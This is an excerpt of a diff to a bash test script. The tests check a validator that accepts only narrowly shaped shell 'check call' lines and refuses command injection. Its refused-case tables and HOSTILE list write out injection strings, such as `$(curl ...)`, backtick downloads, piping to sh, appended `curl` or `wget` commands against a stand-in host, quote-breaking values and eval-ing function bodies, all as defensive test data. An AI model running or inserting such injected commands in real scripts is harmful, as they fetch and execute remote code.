@@ -1511,23 +1511,283 @@ while IFS=$'\t' read -r what line; do
   CASE="AC16 harness form: accepted ($what): exit 0"
   check test "$rc" -eq 0; check grep -q '^harness assertion' "$work/hf.out"
 done <"$work/hf-accepted.tsv"
-# the distinct lines of the committed rows for bin/refresh-inputs-test.sh (the final P3 tree): the harness lines among them must be accepted, and all of them run in the runtime proof
+# --- REQ-SUP-001-AC16, the THIRD allowed row form (advisor step 5, Oct 11): a HARNESS CHECK CALL. The line is exactly t "RULE" "TITLE" FN "LIT" "$VAR",
+# optionally followed by spaces and a # comment, where FN is a function defined in the SAME file (harness_form.py --in FILE) by its one top-level, one-line
+# definition FN() { CALLEE "$@"; } (outside comments, heredocs, strings, substitutions, blocks and continuations; no file sourced after it; no other
+# definition, alias or unset of FN anywhere in the file; the call never before it), LIT is one double-quoted literal, and VAR is assigned in that file exactly
+# once, at top level, on a line holding only literal-path assignments VAR="$root/SEG/..." (never reassigned anywhere). RULE and TITLE take exactly the
+# characters of the real titles (call_title_chars). A file whose structure the scan cannot resolve is refused (fail closed). The called function's body is
+# outside the line's identity; it is in the same file, so the review of that file sees it.
+cat >"$work/hf-ctx.sh" <<'EOF'
+#!/usr/bin/env bash
+# a synthetic file in the shape of bin/build-apk-test.sh: the context the check-call corpus is judged in
+. "$(cd "$(dirname "$0")" && pwd)/lib.sh"
+export MODE=1   # a trailing comment
+ck() { y "$@"; }
+cKk() { y "$@"; }
+c_k() { y "$@"; }
+c2k() { y "$@"; }
+M="$root/build/melange.yaml" MF="$root/build/melange-fips.yaml"
+Mx="$root/a"
+M_="$root/b"
+M1="$root/c"
+W="$work/a"
+H="$HOME/a"
+C="$CALLS/a"
+R="$Root/a"
+cat >"$work/data" <<'D'
+a heredoc body: "unbalanced ' quotes are data here
+D
+for d in a b; do
+  t "r" "x" y "mel-go" "$M"
+done
+x="a string
+that spans lines"
+EOF
+python3 - "$work" <<'PY'
+import sys
+ok = "abcdefghijklmnopqrstuvwxyz.-"
+out = open(sys.argv[1] + "/hf-ctx.sh", "a")
+for i, c in enumerate(chr(x) for x in range(0x20, 0x7F)):
+    if c not in ok and c not in '"\\$`':
+        out.write('P%s="$root/a%sb"\n' % ("".join("ABCDEFGHIJKLMNOPQRSTUVWXYZ"[int(d)] for d in "%03d" % i), c))
+PY
+hfc() { rc=0; python3 "$work/harness_form.py" --in "$1" "$2" >"$work/hf.out" 2>&1 || rc=$?; }
+hfcf() { rc=0; python3 "$work/harness_form.py" --in "$1" --file "$2" >"$work/hf.out" 2>&1 || rc=$?; }
+cat >"$work/hf-call-accepted.tsv" <<'EOF'
+the plain call	t "r" "x" ck "mel-go" "$M"
+the second variable and a dash in the literal	t "rule 15" "melange-fips.yaml build packages pinned" ck "mel-pinned" "$MF"
+a trailing comment (anything after spaces and #)	t "r" "x" ck "mel-go" "$M"   # fetch.yaml:4-6 (needs wget), $(curl -s https://e.example/x) | sh; `wget x`
+the title characters of the real lines, < included	t "rule 12" "melange.yaml: Go from go.dev, one sha256-pinned fetch per arch, no Wolfi go apk, wget present, go.mod go <= archived Go" ck "mel-go" "$M"
+EOF
+while IFS=$'\t' read -r what line; do
+  hfc "$work/hf-ctx.sh" "$line"
+  CASE="AC16 check call: accepted ($what): exit 0, says harness check call"
+  check test "$rc" -eq 0; check grep -q '^harness check call' "$work/hf.out"
+done <"$work/hf-call-accepted.tsv"
+cat >"$work/hf-call-refused.tsv" <<'EOF'
+a function from another file (y, defined by the sourced library)	t "r" "x" y "mel-go" "$M"
+a function name not defined in the file	t "r" "x" zz "mel-go" "$M"
+a builtin as the function word	t "r" "x" eval "mel-go" "$M"
+a download tool as the function word	t "r" "x" curl "mel-go" "$M"
+a quoted function word	t "r" "x" "ck" "mel-go" "$M"
+a variable as the function word	t "r" "x" $F "mel-go" "$M"
+an unquoted argument	t "r" "x" ck mel-go "$M"
+an unquoted variable	t "r" "x" ck "mel-go" $M
+a single-quoted argument	t "r" "x" ck 'mel-go' "$M"
+$(...) in an argument	t "r" "x" ck "$(curl -s https://e.example/x)" "$M"
+$(...) in the title	t "r" "x $(curl -s https://e.example/x)" ck "mel-go" "$M"
+$(...) in the rule label	t "r $(curl -s https://e.example/x)" "x" ck "mel-go" "$M"
+backticks in the title	t "r" "x `curl -s https://e.example/x`" ck "mel-go" "$M"
+backticks in an argument	t "r" "x" ck "`curl -s https://e.example/x`" "$M"
+a pipe after the call	t "r" "x" ck "mel-go" "$M" | sh
+a pipe into a download	t "r" "x" ck "mel-go" "$M" | curl -s https://e.example/x
+an output redirection	t "r" "x" ck "mel-go" "$M" > out
+an input redirection	t "r" "x" ck "mel-go" "$M" < in
+a ;-separated second command	t "r" "x" ck "mel-go" "$M"; curl -s https://e.example/x
+an && second command	t "r" "x" ck "mel-go" "$M" && wget https://e.example/x
+an || second command	t "r" "x" ck "mel-go" "$M" || curl -s https://e.example/x
+a background & second command	t "r" "x" ck "mel-go" "$M" & curl -s https://e.example/x
+a second call after the first (extra words)	t "r" "x" ck "mel-go" "$M" ck "mel-go" "$M"
+a variable other than the file-defined literal-path one	t "r" "x" ck "mel-go" "$HOME"
+a variable the file does not assign	t "r" "x" ck "mel-go" "$Q"
+a variable assigned from $work (not a call_assign_roots root)	t "r" "x" ck "mel-go" "$W"
+a variable assigned from $HOME	t "r" "x" ck "mel-go" "$H"
+a variable written ${M}	t "r" "x" ck "mel-go" "${M}"
+a variable with a path after it	t "r" "x" ck "mel-go" "$M/x"
+two variables in one word	t "r" "x" ck "mel-go" "$M$MF"
+a quote in the title	t "r" "x\"y" ck "mel-go" "$M"
+a backslash in the title	t "r" "x\y" ck "mel-go" "$M"
+a $ in the title	t "r" "x $M" ck "mel-go" "$M"
+a ; in the title (outside call_title_chars)	t "r" "x;y" ck "mel-go" "$M"
+a > in the title (outside call_title_chars)	t "r" "x>y" ck "mel-go" "$M"
+an unquoted title	t "r" x ck "mel-go" "$M"
+no rule label	t "x" ck "mel-go" "$M"
+not the t function	run "r" "x" ck "mel-go" "$M"
+trailing text that is not a # comment	t "r" "x" ck "mel-go" "$M" x
+a # glued to the variable (no space, so not a comment start)	t "r" "x" ck "mel-go" "$M"#x
+a glob in an argument	t "r" "x" ck "mel*" "$M"
+a brace in an argument	t "r" "x" ck "{a,b}" "$M"
+a tilde in an argument	t "r" "x" ck "~" "$M"
+an unquoted glob argument	t "r" "x" ck * "$M"
+an unquoted tilde argument	t "r" "x" ck ~ "$M"
+a literal that starts with -	t "r" "x" ck "-go" "$M"
+a literal with a space	t "r" "x" ck "mel go" "$M"
+a literal with a slash	t "r" "x" ck "/etc/passwd" "$M"
+two literals	t "r" "x" ck "mel-go" "mel-go" "$M"
+no literal	t "r" "x" ck "$M"
+no variable	t "r" "x" ck "mel-go"
+the variable before the literal	t "r" "x" ck "$M" "mel-go"
+EOF
+while IFS=$'\t' read -r what line; do
+  hfc "$work/hf-ctx.sh" "$line"
+  CASE="AC16 check call: refused ($what): exit 1, says refused"
+  check test "$rc" -eq 1; check grep -q '^refused: ' "$work/hf.out"
+done <"$work/hf-call-refused.tsv"
+hf 't "r" "x" ck "mel-go" "$M"'
+CASE="AC16 check call: refused with no file to read the definition from (no --in): exit 1"
+check test "$rc" -eq 1; check grep -q 'needs its own file' "$work/hf.out"
+# the context variants: the same good line judged in files whose definition or assignment is missing, hidden or changed
+python3 - "$work" <<'PY'
+import json, sys
+w = sys.argv[1]
+HEAD = '#!/usr/bin/env bash\n. "$(cd "$(dirname "$0")" && pwd)/lib.sh"\n'
+DEF = 'ck() { y "$@"; }\n'
+ASG = 'M="$root/build/melange.yaml" MF="$root/build/melange-fips.yaml"\n'
+LINE = 't "r" "x" ck "mel-go" "$M"'
+CALL = LINE + "\n"
+def c(what, body, line=LINE): return {"what": what, "ctx": body, "line": line}
+V = [
+    c("the definition is missing", HEAD + ASG + CALL),
+    c("the definition is only in a comment", HEAD + "# ck() { y \"$@\"; }\n" + ASG + CALL),
+    c("the definition is only in a heredoc body", HEAD + "cat >f <<'X'\n" + DEF + "X\n" + ASG + CALL),
+    c("the definition is only in an unquoted-delimiter heredoc body", HEAD + "cat >f <<X\n" + DEF + "X\n" + ASG + CALL),
+    c("the definition is only inside a single-quoted string", HEAD + "x='\n" + DEF + "'\n" + ASG + CALL),
+    c("the definition line is inside a double-quoted string", HEAD + "x=\"\n" + DEF + "\"\n" + ASG + CALL),
+    c("the definition is inside an if block", HEAD + "if true; then\n" + DEF + "fi\n" + ASG + CALL),
+    c("the definition is inside a for loop", HEAD + "for i in 1; do\n" + DEF + "done\n" + ASG + CALL),
+    c("the definition is inside another function", HEAD + "f() {\n" + DEF + "}\n" + ASG + CALL),
+    c("the definition is inside a subshell", HEAD + "(\n" + DEF + ")\n" + ASG + CALL),
+    c("the definition is inside a $( ) substitution", HEAD + "x=$(\n" + DEF + ")\n" + ASG + CALL),
+    c("the definition follows a backslash continuation", HEAD + "echo a \\\n" + DEF + ASG + CALL),
+    c("the definition is indented", HEAD + "  " + DEF + ASG + CALL),
+    c("the definition body downloads", HEAD + "ck() { curl -s https://e.example/x; }\n" + ASG + CALL),
+    c("the definition body evals", HEAD + "ck() { eval \"$@\"; }\n" + ASG + CALL),
+    c("the definition body runs its first argument", HEAD + "ck() { \"$@\"; }\n" + ASG + CALL),
+    c("the definition body has a second command", HEAD + "ck() { y \"$@\"; curl -s https://e.example/x; }\n" + ASG + CALL),
+    c("the definition body passes $@ unquoted", HEAD + "ck() { y $@; }\n" + ASG + CALL),
+    c("the definition spans lines", HEAD + "ck() {\n  y \"$@\"\n}\n" + ASG + CALL),
+    c("the function is defined twice", HEAD + DEF + ASG + "ck() { cat \"$@\"; }\n" + CALL),
+    c("the function is redefined with the function keyword", HEAD + DEF + ASG + "function ck { curl -s https://e.example/x; }\n" + CALL),
+    c("the function name is aliased", HEAD + DEF + ASG + "alias ck=curl\n" + CALL),
+    c("the function is unset", HEAD + DEF + ASG + "unset -f ck\n" + CALL),
+    c("a file is sourced after the definition (.)", HEAD + DEF + ASG + ". ./other.sh\n" + CALL),
+    c("a file is sourced after the definition (source)", HEAD + DEF + ASG + "source ./other.sh\n" + CALL),
+    c("the line calls the function before its definition", HEAD + CALL + DEF + ASG),
+    c("the variable is not assigned", HEAD + DEF + CALL),
+    c("the variable is assigned from a substitution", HEAD + DEF + 'M="$(curl -s https://e.example/x)"\n' + CALL),
+    c("the variable is assigned from $HOME", HEAD + DEF + 'M="$HOME/x"\n' + CALL),
+    c("the variable is assigned unquoted", HEAD + DEF + 'M=$root/x\n' + CALL),
+    c("the assignment line carries a command", HEAD + DEF + 'M="$root/a" curl -s https://e.example/x\n' + CALL),
+    c("the assignment line carries a second statement", HEAD + DEF + 'M="$root/a"; curl -s https://e.example/x\n' + CALL),
+    c("the variable is assigned twice", HEAD + DEF + ASG + 'M="$root/b"\n' + CALL),
+    c("the variable is appended to", HEAD + DEF + ASG + "M+=x\n" + CALL),
+    c("the variable is read into", HEAD + DEF + ASG + "read M <f\n" + CALL),
+    c("the variable is a loop variable", HEAD + DEF + ASG + "for M in a; do :; done\n" + CALL),
+    c("the variable is exported with a value", HEAD + DEF + ASG + "export M=x\n" + CALL),
+    c("the variable is declared with a value", HEAD + DEF + ASG + "declare -g M=x\n" + CALL),
+    c("the variable is printf -v'd", HEAD + DEF + ASG + "printf -v M x\n" + CALL),
+    c("the variable is reassigned after a semicolon", HEAD + DEF + ASG + "echo a; M=x\n" + CALL),
+    c("the variable is assigned as an array element", HEAD + DEF + ASG + "M[0]=x\n" + CALL),
+    c("the variable is assigned by getopts", HEAD + DEF + ASG + "getopts ab M\n" + CALL),
+    c("the assignment is only in a comment", HEAD + DEF + '# M="$root/a"\n' + CALL),
+    c("the assignment is only in a heredoc body", HEAD + DEF + "cat >f <<'X'\n" + 'M="$root/a"\n' + "X\n" + CALL),
+    c("the assignment is inside an if block", HEAD + DEF + "if true; then\n" + 'M="$root/a"\n' + "fi\n" + CALL),
+    c("the file ends inside an open double quote (the structure does not resolve)", HEAD + DEF + ASG + CALL + 'echo "x\n'),
+    c("the file ends inside an open heredoc", HEAD + DEF + ASG + CALL + "cat <<'X'\nbody\n"),
+    c("the file has a closer with no opener", HEAD + DEF + ASG + CALL + "fi\n"),
+    c("the file ends inside an open block", HEAD + DEF + ASG + CALL + "if true; then\n"),
+]
+json.dump(V, open(w + "/hf-call-ctx.json", "w"), indent=1)
+for i, v in enumerate(V):
+    open("%s/hcc-%02d.sh" % (w, i), "w").write(v["ctx"]); open("%s/hcc-%02d.line" % (w, i), "w").write(v["line"]); open("%s/hcc-%02d.what" % (w, i), "w").write(v["what"])
+PY
+for f in "$work"/hcc-*.sh; do
+  hfcf "$f" "${f%.sh}.line"
+  CASE="AC16 check call: refused in a file where $(cat "${f%.sh}.what"): exit 1, says refused"
+  check test "$rc" -eq 1; check grep -q '^refused: ' "$work/hf.out"
+done
+CASE="AC16 check call: the control file of the variants (the same line, the definition and the assignment as written) is accepted: the variants fail for their change only"
+printf '#!/usr/bin/env bash\n. "$(cd "$(dirname "$0")" && pwd)/lib.sh"\nck() { y "$@"; }\nM="$root/build/melange.yaml" MF="$root/build/melange-fips.yaml"\nt "r" "x" ck "mel-go" "$M"\n' >"$work/hcc-control.sh"
+hfc "$work/hcc-control.sh" 't "r" "x" ck "mel-go" "$M"'
+check test "$rc" -eq 0
+# characters bash reads differently: the call shape with a control character, a newline or a non-ASCII character
+python3 - "$work" <<'PY'
+import sys
+w = sys.argv[1]
+B = 't "r" "x" ck "mel-go" "$M"'
+cases = [
+    ("a literal newline after the call (a second command)", B + "\ncurl -s https://e.example/x"),
+    ("a literal newline in the title", B.replace('"x"', '"x\ny"')),
+    ("a carriage return after the call", B + "\rcurl -s https://e.example/x"),
+    ("a control character (0x01) in the title", B.replace('"x"', '"x\x01"')),
+    ("an escape (0x1b) in the literal", B.replace("mel-go", "mel\x1b-go")),
+    ("a vertical tab before the variable", B.replace(' "$M"', '\x0b"$M"')),
+    ("DEL (0x7f) in the title", B.replace('"x"', '"x\x7f"')),
+    ("a non-ASCII letter in the title", B.replace('"x"', '"café"')),
+    ("a non-breaking space before the function word", B.replace(" ck ", "\xa0ck ")),
+]
+for i, (what, line) in enumerate(cases):
+    open("%s/ctlc-%02d.txt" % (w, i), "w", encoding="utf-8", newline="").write(line)
+    open("%s/ctlc-%02d.what" % (w, i), "w").write(what)
+PY
+for f in "$work"/ctlc-*.txt; do
+  hfcf "$work/hf-ctx.sh" "$f"
+  CASE="AC16 check call: refused ($(cat "${f%.txt}.what")): exit 1, says refused"
+  check test "$rc" -eq 1; check grep -q '^refused: ' "$work/hf.out"
+done
+# the context of the P4 check-call rows: bin/build-apk-test.sh itself when this tree has it (the pull request that adds the lines, and main after it); in a
+# tree without it (the rows pull request, which merges first), these lines copied verbatim from it. When the file is present, every line here must be in it.
+cat >"$work/p4-ctx.sh" <<'EOF'
+#!/usr/bin/env bash
+. "$(cd "$(dirname "$0")" && pwd)/melange-apko-lib.sh"
+export FSCACHE_TEST_MODE=1   # --recipe (and the release-sign key directory, through the wrapper) work only in test mode
+# ck: this file's own wrapper of the static check y (bin/melange-apko-lib.sh), so the ruled check-call lines below call a function defined in this file (REQ-SUP-001-AC16)
+ck() { y "$@"; }
+M="$root/build/melange.yaml" MF="$root/build/melange-fips.yaml"
+t "rule 12" "melange.yaml: Go from go.dev, one sha256-pinned fetch per arch, no Wolfi go apk, wget present, go.mod go <= archived Go" ck "mel-go" "$M"   # fetch.yaml:4-6 (needs wget), :78-80 (a checksum is required), :85-90 (cache lookup), :108-111 (verification)
+t "rule 15" "melange.yaml build packages pinned name=version incl. git, busybox, ca-certificates-bundle, wget" ck "mel-pinned" "$M"
+EOF
+p4src="$root/bin/build-apk-test.sh"; test -f "$p4src" || p4src="$work/p4-ctx.sh"
+if test -f "$root/bin/build-apk-test.sh"; then
+  CASE="AC16 check call: bin/build-apk-test.sh is in this tree, so the P4 rows are judged in it, and every line of the copied context is in it verbatim"
+  check python3 -c "import sys; f = open(sys.argv[2]).read().split('\n'); assert all(l in f for l in open(sys.argv[1]).read().split('\n') if l)" "$work/p4-ctx.sh" "$root/bin/build-apk-test.sh"
+fi
+# what each committed check-call line CALLS: run as written with a stub of its function that records its arguments; it must pass the check name and the path
+hcall() { local d; d=$(mktemp -d "$work/hcall.XXXXXX")
+  work="$d" bash -c 'ck() { printf "%s\n" "$@" >"$work/argv"; }; t() { shift 2; "$@"; }; M=/r/build/melange.yaml; '"$1" </dev/null >/dev/null 2>&1; cat "$d/argv" 2>/dev/null; }
+CASE="AC16 check call semantics: the rule 12 line calls ck with exactly mel-go and the melange.yaml path"
+check test "$(hcall "$(grep -F 'ck "mel-go"' "$work/p4-ctx.sh")")" = "$(printf 'mel-go\n/r/build/melange.yaml')"
+CASE="AC16 check call semantics: the rule 15 line calls ck with exactly mel-pinned and the melange.yaml path"
+check test "$(hcall "$(grep -F 'ck "mel-pinned"' "$work/p4-ctx.sh")")" = "$(printf 'mel-pinned\n/r/build/melange.yaml')"
+# the distinct lines of the committed rows for bin/refresh-inputs-test.sh (the final P3 tree) and bin/build-apk-test.sh (P4): the harness lines among them must be accepted, and all of them run in the runtime proof
 cat >"$work/hf-real.txt" <<'EOF'
 # ---- P3 review round 2 (Sonnet extras): pointer, certified.txt shape, index tied to the locks, datahash, ranges, curl flags, openssl -----------------------------
 # the live melange resolution moves busybox to 9.9.9-r0: a copy of the live melange lock with that version, and the new apk in the live archive/curl dir
 # url characters, curl flags and caps
+t "rule 12" "melange.yaml: Go from go.dev, one sha256-pinned fetch per arch, no Wolfi go apk, wget present, go.mod go <= archived Go" ck "mel-go" "$M" # fetch.yaml:4-6 (needs wget), :78-80 (a checksum is required), :85-90 (cache lookup), :108-111 (verification)
+t "rule 15" "melange.yaml build packages pinned name=version incl. git, busybox, ca-certificates-bundle, wget" ck "mel-pinned" "$M"
+t "rule 15" "the inputs manifest holds the melange lock and the environment read back from the apk" bash -c 'grep -q -- "busybox=1.37.0-r5" "$1" && grep -q -- "wget=1.25.0-r0" "$1"' _ "$work/o1-inputs-manifest.json"
 EOF
 while IFS= read -r line; do
-  case "$line" in t\ *) hf "$line"; CASE="AC16 harness form: accepted (the committed row line ${line:0:60}...): exit 0"; check test "$rc" -eq 0;; esac
+  case "$line" in t\ *) hfc "$p4src" "$line"; CASE="AC16 harness form: accepted (the committed row line ${line:0:60}...): exit 0"; check test "$rc" -eq 0;; esac
 done <"$work/hf-real.txt"
-CASE="AC16 harness form: the real-line list is exactly the distinct lines of the committed rows for bin/refresh-inputs-test.sh (by whole-line hash)"
+CASE="AC16 harness form: the real-line list is exactly the distinct lines of the committed rows for bin/refresh-inputs-test.sh and bin/build-apk-test.sh (by whole-line hash)"
 check python3 - "$work/hf-real.txt" "$root/.github/supply-chain-exceptions.json" <<'PY'
 import hashlib, json, sys
 H = lambda s: hashlib.sha256(s.encode("utf-8", "replace")).hexdigest()[:16]
 real = {H(" ".join(l.split())) for l in open(sys.argv[1]).read().split("\n") if l}
-rows = {r["line"] for r in json.load(open(sys.argv[2]))["unmeasured_text"] if r["file"] == "bin/refresh-inputs-test.sh"}
+rows = {r["line"] for r in json.load(open(sys.argv[2]))["unmeasured_text"] if r["file"] in ("bin/refresh-inputs-test.sh", "bin/build-apk-test.sh")}
 assert real == rows, (sorted(real ^ rows))
 PY
+# --- what the committed build-apk harness line ASSERTS (P4): the ruled line is run, as written, against manifests under a scratch $work. Both package pins
+# present -> exit 0; either pin missing, a different version of either, or an empty file -> exit 1. Its ruling says exactly this, so the prose is checked by execution.
+grep -F 'bash -c' "$work/hf-real.txt" | grep -F 'o1-inputs-manifest.json' >"$work/hf-p4-line.txt"
+hp4() {   # hp4 MANIFEST-TEXT: runs the committed line with $work pointing at a scratch dir holding o1-inputs-manifest.json; sets rc
+  local d; d=$(mktemp -d "$work/hp4.XXXXXX"); printf '%s' "$1" >"$d/o1-inputs-manifest.json"; rc=0
+  work="$d" bash -c 't() { shift 2; "$@"; }; '"$(cat "$work/hf-p4-line.txt")" </dev/null >/dev/null 2>&1 || rc=$?; }
+CASE="AC16 harness semantics (bin/build-apk-test.sh): exactly one committed line reads o1-inputs-manifest.json"
+check test "$(wc -l <"$work/hf-p4-line.txt")" -eq 1
+hp4 '{"melange": ["busybox=1.37.0-r5", "wget=1.25.0-r0"]}'
+CASE="AC16 harness semantics (bin/build-apk-test.sh): a manifest with both pins (busybox=1.37.0-r5, wget=1.25.0-r0) passes: exit 0"
+check test "$rc" -eq 0
+for v in 'without busybox=1.37.0-r5	{"melange": ["wget=1.25.0-r0"]}' 'without wget=1.25.0-r0	{"melange": ["busybox=1.37.0-r5"]}' \
+         'with busybox at another version	{"melange": ["busybox=1.37.0-r6", "wget=1.25.0-r0"]}' 'with wget at another version	{"melange": ["busybox=1.37.0-r5", "wget=1.25.0-r1"]}' \
+         'empty	'; do
+  hp4 "${v#*	}"
+  CASE="AC16 harness semantics (bin/build-apk-test.sh): a manifest ${v%%	*} fails: exit 1"
+  check test "$rc" -eq 1
+done
 # --- RUNTIME proof (Sonnet R1): every corpus line is EXECUTED under every bash on PATH (one per version: bash 5, whose test -v / -R / arithmetic operands
 # evaluate $(...) even in single quotes, and, where present, an older bash such as 3.2), with a stub directory first on PATH whose curl, wget, touch, cmd and
 # ls only write a marker file; the inner bash is the same shell. Then: every line that wrote the marker was refused by the parser, the planted reproductions
@@ -1535,7 +1795,9 @@ PY
 # with quote-, substitution- and subscript-carrying argument values.
 cat >"$work/hf_run.py" <<'PY'
 import json, os, subprocess, sys, tempfile
-hfpy, w = sys.argv[1], sys.argv[2]
+hfpy, w, p4src = sys.argv[1], sys.argv[2], sys.argv[3]
+CTX = os.path.join(w, "hf-ctx.sh")
+PRELUDE = 'ck() { y "$@"; }\nM="$root/build/melange.yaml" MF="$root/build/melange-fips.yaml"\n'   # the definition and the assignment (y stays undefined)
 def shells():                                              # every bash on PATH, one per version: bash 5 (the reproductions) and, where present, an older one (3.2)
     seen, out = set(), []
     for d in os.environ.get("PATH", "").split(os.pathsep):
@@ -1549,28 +1811,29 @@ def shells():                                              # every bash on PATH,
 SH = shells()
 b5 = next((p for p, v in SH if int(v.split(".")[0]) >= 5), None)
 corpus = []
-for kind, name in (("refused", "hf-refused.tsv"), ("accepted", "hf-accepted.tsv")):
+for kind, name, src in (("refused", "hf-refused.tsv", None), ("accepted", "hf-accepted.tsv", None), ("refused", "hf-call-refused.tsv", CTX), ("accepted", "hf-call-accepted.tsv", CTX)):
     for l in open(os.path.join(w, name)).read().split("\n"):
         if l:
-            what, line = l.split("\t", 1); corpus.append((kind, what, line))
+            what, line = l.split("\t", 1); corpus.append((kind, what, line, src))
 for l in open(os.path.join(w, "hf-real.txt")).read().split("\n"):
     if l:
-        corpus.append(("real", l[:60], l))
+        corpus.append(("real", l[:60], l, p4src))
 for f in sorted(os.listdir(w)):
-    if f.startswith("ctl-") and f.endswith(".txt"):
-        corpus.append(("refused", open(os.path.join(w, f[:-4] + ".what")).read(), open(os.path.join(w, f), encoding="utf-8", newline="").read()))
+    for pre, src in (("ctl-", None), ("ctlc-", CTX)):
+        if f.startswith(pre) and f.endswith(".txt"):
+            corpus.append(("refused", open(os.path.join(w, f[:-4] + ".what")).read(), open(os.path.join(w, f), encoding="utf-8", newline="").read(), src))
 # argument values that would add a command if the outer shell spliced them into code (Codex R1): the accepted form passes them as data only
 HOSTILE = ["x'; curl -s https://e.example/x; #", 'x"; curl -s https://e.example/x; #', "$(curl -s https://e.example/x)", "a[$(curl -s https://e.example/x)]",
            "`curl -s https://e.example/x`"]
 out = {"bash5": b5, "shells": [v for _, v in SH], "hostile": HOSTILE, "lines": []}
 if b5:
-    for kind, what, line in corpus:
+    for kind, what, line, src in corpus:
         marks = {}
         for sh, ver in SH:
             d = tempfile.mkdtemp(dir=w, prefix="hfrun.")
             st = os.path.join(d, "stubs"); os.mkdir(st)
             mark = os.path.join(d, "marker")
-            for n in ("curl", "wget", "touch", "cmd", "ls"):
+            for n in ("curl", "wget", "touch", "cmd", "ls", "sh", "eval", "zz"):
                 p = os.path.join(st, n); open(p, "w").write("#!%s\necho \"$0 $*\" >>\"$MARK\"\n" % sh); os.chmod(p, 0o755)
             p = os.path.join(st, "bash"); open(p, "w").write("#!%s\nexec %s \"$@\"\n" % (sh, sh)); os.chmod(p, 0o755)
             for n, t in (("f", "a\n"), ("g", "b\n"), ("rc", "0\n"), ("calls", "curl --proto =https --tlsv1.2 -g --max-filesize 1 --max-time 1 x\n"),
@@ -1578,21 +1841,21 @@ if b5:
                 open(os.path.join(d, n), "w").write(t)
             def run(work, calls, u):
                 if os.path.exists(mark): os.remove(mark)
-                env = {"PATH": st + os.pathsep + os.environ["PATH"], "HOME": d, "MARK": mark, "work": work, "CALLS": calls, "u": u, "LC_ALL": "C"}
+                env = {"PATH": st + os.pathsep + os.environ["PATH"], "HOME": d, "MARK": mark, "work": work, "CALLS": calls, "u": u, "root": u, "LC_ALL": "C"}
                 try:
-                    subprocess.run([sh, "-c", 't() { shift 2; "$@"; }\n' + line], cwd=d, env=env, stdin=subprocess.DEVNULL, capture_output=True, timeout=20)
+                    subprocess.run([sh, "-c", 't() { shift 2; "$@"; }\n' + (PRELUDE if src else "") + line], cwd=d, env=env, stdin=subprocess.DEVNULL, capture_output=True, timeout=20)
                 except subprocess.TimeoutExpired:
                     pass
                 return os.path.exists(mark)
             marks[ver] = {"plain": run(d, os.path.join(d, "calls"), "x"), "hostile": [h for h in HOSTILE if run(h, h, h)]}
-        verdict = subprocess.run([sys.executable, hfpy, line], capture_output=True, text=True, stdin=subprocess.DEVNULL)
+        verdict = subprocess.run([sys.executable, hfpy] + (["--in", src] if src else []) + [line], capture_output=True, text=True, stdin=subprocess.DEVNULL)
         out["lines"].append({"kind": kind, "what": what, "marked": any(m["plain"] for m in marks.values()),
                              "marked_hostile": sorted({h for m in marks.values() for h in m["hostile"]}), "by_shell": marks,
                              "refused": verdict.returncode == 1 and verdict.stdout.startswith("refused: "),
-                             "accepted": verdict.returncode == 0 and verdict.stdout.startswith("harness assertion")})
+                             "accepted": verdict.returncode == 0 and verdict.stdout.startswith(("harness assertion", "harness check call"))})
 json.dump(out, open(os.path.join(w, "hf-run.json"), "w"), indent=1)
 PY
-python3 "$work/hf_run.py" "$work/harness_form.py" "$work" </dev/null
+python3 "$work/hf_run.py" "$work/harness_form.py" "$work" "$p4src" </dev/null
 hfr() { python3 - "$work/hf-run.json" "$1" <<'PY'
 import json, sys
 r = json.load(open(sys.argv[1])); L = r["lines"]; m = sys.argv[2]
@@ -1659,7 +1922,7 @@ SEPS = ["&", ";;", "|&", "&>", ">", "<", ">>", "<<", "<<<", ">|", "<>", "(", ")"
 EXITS = ["10", "-1", "x", "1 2", "01", "\"1\"", "$x", "256", "9 9", "\"$1\""] + [c for c in CHARS]
 BODY = lambda b, args=' _ "$CALLS"': "t \"r\" \"x\" bash -c '" + b + "'" + args
 L = []
-def case(cls, line, reason=None): L.append((cls, line, reason))
+def case(cls, line, reason=None): L.append((cls, line, reason, None))
 for c in CHARS:
     if c not in W["rule_title_chars"]:
         case("a character outside rule_title_chars, in the RULE", 't "r' + c + '" "x" bash -c \'grep -q -- . "$1"\' _ "$CALLS"')
@@ -1751,11 +2014,55 @@ case("more ARGs than max_args", 't "r" "x" bash -c \'grep -q -- . "$1"\' _' + ' 
 for l in open(sys.argv[3]).read().split("\n"):
     if l:
         what, line = l.split("\t", 1); case("the refused corpus: " + what, line)
+# the check-call form (third): every token class outside its keys, in every position, judged in the synthetic context file (hf-ctx.sh, next to the corpus)
+wd = os.path.dirname(os.path.abspath(sys.argv[3]))
+CTX = open(os.path.join(wd, "hf-ctx.sh")).read()
+CB = lambda title="x", fn="ck", lit="mel-go", var="M", tail="", rule="r": 't "' + rule + '" "' + title + '" ' + fn + ' "' + lit + '" "$' + var + '"' + tail
+def ccase(cls, line, reason=None): L.append((cls, line, reason, CTX))
+for c in CHARS:
+    if c not in W["call_title_chars"]:
+        ccase("check call: a character outside call_title_chars, in the RULE", CB(rule="r" + c))
+        ccase("check call: a character outside call_title_chars, in the TITLE", CB(title="x" + c))
+    if c not in W["call_fn_chars"]:
+        ccase("check call: a character outside call_fn_chars, in the function word", CB(fn="c" + c + "k"))
+    if c not in W["call_lit_chars"]:
+        ccase("check call: a character outside call_lit_chars, in the literal", CB(lit="mel" + c + "go"))
+    if c not in W["call_var_chars"]:
+        ccase("check call: a character outside call_var_chars, in the variable name", CB(var="M" + c))
+    if c != W["call_comment"] and c not in " \t":
+        ccase("check call: trailing text after a space that is not a # comment", CB(tail=" " + c + "x"))
+    if c not in " \t":
+        ccase("check call: a character glued after the variable", CB(tail=c + "x"))
+for w in WORDS:
+    ccase("check call: a word as the function word (not defined in the file)", CB(fn=w))
+    if any(c not in W["call_lit_chars"] for c in w) or w.startswith(W["call_lit_first_char_not"] or "\0"):
+        ccase("check call: a word outside call_lit_chars as the literal", CB(lit=w))
+    ccase("check call: a word unquoted in the literal position", 't "r" "x" ck ' + w + ' "$M"')
+    ccase("check call: a word after the call", CB(tail=" " + w))
+for v in VARS:
+    if v not in ("M", "MF"):
+        ccase("check call: a variable the file does not assign as a literal path", CB(var=v))
+for v in ("Mx", "M_", "M1", "W", "H", "C", "R"):
+    ccase("check call: a variable assigned in the file outside the form (its name, or a root outside call_assign_roots)", CB(var=v))
+for i, c in enumerate(chr(x) for x in range(0x20, 0x7F)):
+    if c not in W["call_path_chars"] and c not in '"\\$`/':
+        ccase("check call: a variable whose assignment has a path character outside call_path_chars", CB(var="P" + "".join("ABCDEFGHIJKLMNOPQRSTUVWXYZ"[int(d)] for d in "%03d" % i)))
+for s in SEPS:
